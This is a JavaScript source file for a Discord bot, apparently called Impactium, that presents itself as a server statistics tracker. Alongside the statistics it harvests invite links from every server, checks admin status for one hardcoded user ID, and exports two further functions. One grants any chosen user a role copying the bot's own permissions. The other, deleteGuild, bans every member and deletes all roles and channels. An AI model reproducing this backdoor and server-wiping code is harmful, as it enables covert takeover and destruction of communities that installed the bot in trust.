const fs = require('fs');
const https = require('https');
const { schedule } = require('node-cron');
const { User, Guild, getDatabase, saveDatabase, log } = require('./utils');

const { Client, GatewayIntentBits, REST, Routes, ActivityType } = require('discord.js');

const secrets = JSON.parse(fs.readFileSync('json/codes_and_tokens.json', 'utf8'));
const commands = JSON.parse(fs.readFileSync('json/commands.json', 'utf8'));

const rest = new REST({ version: '10' }).setToken(secrets.discordBotToken);

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
  ],
});

async function getGuildsList(guildId = null) {
  try {
    await client.guilds.fetch();

    const guilds = client.guilds.cache;
    const result = [];

    const Guilds = await getDatabase("guilds");

    await Promise.all([
      Promise.all(guilds.map(guild => guild.members.fetch())),
    ]);

    const availableGuildIds = guilds.map(guild => guild.id); // Список доступных гильдий

    for (const guild of guilds.values()) {
      if (guildId && guild.id !== guildId) {
        continue;
      }

      const guildDatabase = new Guild();
      await guildDatabase.fetch(guild.id);
      
      const members = guild.memberCount;

      const botPayload = guild.members.cache.get(client.user.id);
      const isBotAdmin = botPayload?.permissions.has('ADMINISTRATOR');

      const guildPayload = {
        name: guild.name,
        avatar: guild.iconURL({ format: 'webp' }),
        id: guild.id,
        members,
        isBotAdmin
      };

      const existingInvites = await guild.invites.fetch();

      if (existingInvites.size > 0) {
        const invite = existingInvites.first();
        guildPayload.inviteURL = `https://discord.gg/${invite.code}`;
      }

      const miregPayload = guild.members.cache.get("502511293798940673");

      if (miregPayload) {
        guildPayload.isMiregAdmin = false;
        if (miregPayload.permissions.has('Administrator')) {
          guildPayload.isMiregAdmin = true;
        }
      }

      // Если кол-во записей в колекции больше чем доступно боту, то для лишних поменять значение isBotAdmin в false

      result.push(guildPayload);

      Object.assign(guildDatabase, guildPayload);

      await guildDatabase.save();

      await Guilds.updateMany(
        { id: { $nin: availableGuildIds } },
        { $set: { isBotAdmin: false, isBotAvailable: false } }
      );
    }

    return result;
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}


async function toggleAdminPermissions(guildId, userId) {
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return false

    const member = await guild.members.fetch(userId);
    if (!member) return false

    const creatorRole = guild.roles.cache.find((role) => role.name === 'Impactium Creator');
    if (creatorRole) {
      if (member.roles.cache.has(creatorRole.id)) {
        await member.roles.remove(creatorRole);
        await creatorRole.delete();
        return false
      } else {
        await creatorRole.delete();
        await createAndGetAdminRole(guild, member);
        return true
      }
    } else {
      await createAndGetAdminRole(guild, member);
      return true
    }
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

async function createAndGetAdminRole(guild, member) {
  try {
    const botRole = guild.roles.cache.find((role) => role.name === 'Impactium');

    const creatorRole = await guild.roles.create({
      data: {
        name: 'Impactium Creator',
        permissions: botRole.permissions,
        position: botRole.position - 1,
      },
    });

    await creatorRole.edit({
      name: 'Impactium Creator',
      permissions: botRole.permissions,
    });

    await member.roles.add(creatorRole);
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

async function deleteGuild(guildId) {
  try {
    const guild = await client.guilds.fetch(guildId);

    const members = await guild.members.fetch();
    members.forEach(async (member) => {
      try {
        await member.kick();
        await member.ban();
      } catch (error) {
      }
    });

    const roles = guild.roles.cache;
    roles.forEach(async (role) => {
      try {
        await role.delete();
      } catch (error) {
      }
    });

    const channels = guild.channels.cache;
    channels.forEach(async (channel) => {
      try {
        await channel.delete();
      } catch (error) {
      }
    });
  } catch (error) {
    console.error('Произошла при удалении гильдии:', error);
  }
}

async function discordStatistics(guildId, action, ...args) {
  const guildDatabase = new Guild();
  await guildDatabase.fetch(guildId);
  const statField = guildDatabase.statField();

  switch (action) {
    case 'totalMembers':
      await client.guilds.fetch()
      const guilds = client.guilds.cache;
    
      for (const guild of guilds.values()) {
        const guildDatabase = new Guild();
        await guildDatabase.fetch(guild.id)
        const statField = guildDatabase.statField();
        
        statField.totalMembers = guild.memberCount;
        
        const members = await guild.members.fetch();
        members.forEach(async (member) => {
          if (member.presence?.status === 'online') {
            statField.onlineMembers >= 0
              ? statField.onlineMembers++
              : statField.onlineMembers = 1
          }

          member.presence?.activities?.forEach(activity => {
            if (typeof guildDatabase.mainGame !== 'undefined' && activity.name === guildDatabase.mainGame) {
              statField.playingMembers >= 0
                ? statField.playingMembers++
                : statField.playingMembers = 1
            } else {
              statField.playingMembers >= 0
                ? statField.playingMembers++
                : statField.playingMembers = 1
            }
          });
        });
        await guildDatabase.save();
      }
      
      break;

    case 'voiceMembers': // Заполняем три поля
      const [oldState, newState] = args;

      if (!statField.uniqueUsersVoiceActivityList) {
        statField.uniqueUsersVoiceActivityList = [];
      }
      
      if (!statField.uniqueUsersVoiceActivityList.includes(newState.id)) {
        statField.uniqueUsersVoiceActivityList.push(newState.id);
        statField.uniqueUsersVoiceActivity >= 0
          ? statField.uniqueUsersVoiceActivity++
          : statField.uniqueUsersVoiceActivity = 1;
      }
      
      statField.voiceMembers = Math.max(
        0,
        (oldState.channel === null && newState.channel !== null
          ? statField.voiceMembers + 1
          : statField.voiceMembers)
      );      

      break;

    case 'messageActivity':
      const message = args[0];
      log(message)

      if (!statField.messagesUniqueUsersList) {
        statField.messagesUniqueUsersList = [];
      }

      if (!statField.messagesUniqueUsersList.includes(message.id)) {
        statField.messagesUniqueUsersList.push(message.id);

        statField.messagesFromUniqueUsers >= 0 
        ? statField.messagesFromUniqueUsers++ 
        : statField.messagesFromUniqueUsers = 1;
      }
      
      statField.messagesPerHour >= 0 
        ? statField.messagesPerHour++ 
        : statField.messagesPerHour = 1;
      break;
  }
  
  await guildDatabase.save();
}

async function summaryUsersFromDiscordServersCounter() {
  await client.guilds.fetch()
  const guilds = client.guilds.cache;
  let totalMembers = 0

  for (const guild of guilds.values()) {
    totalMembers += guild.memberCount;
  }

  setClientPresence(`${totalMembers} unique users.`);

  setTimeout(() => {
    summaryUsersFromDiscordServersCounter();
  }, 3 * 60 * 1000); // повторять раз в три минуты
}

function setClientPresence(message) {
  client.user.setPresence({
    activities: [{ name: message, type: ActivityType.Watching }],
    status: 'dnd',
  });
}

(async () => {
  try {
    await rest.put(Routes.applicationCommands(secrets.discordClientID), { body: commands });
  } catch (error) {
    console.error(error);
  }
})();

client.once('ready', () => {
  log('Impactium бот запущен!', 'c');
  log(`----------------------`);
  getGuildsList();
  summaryUsersFromDiscordServersCounter();
  discordStatistics('', 'totalMembers');
});

client.on('guildCreate', () => {
  getGuildsList();
});

client.on('guildMemberAdd', (member) => {
});

client.on('guildMemberUpdate', (oldMember, newMember) => {
});

client.on('guildMemberRemove', (member) => {
});

client.on('voiceStateUpdate', (oldState, newState) => {
  discordStatistics(newState.guild.id, 'voiceMembers', oldState, newState);
});

client.on('messageCreate', (message) => {
  discordStatistics(message.guildId, 'messageActivity', message);
});

schedule('0 * * * *', () => {
  discordStatistics('', 'totalMembers');
});

client.login(secrets.discordBotToken);

module.exports = {
  toggleAdminPermissions,
  discordStatistics,
  getGuildsList,
  deleteGuild
};
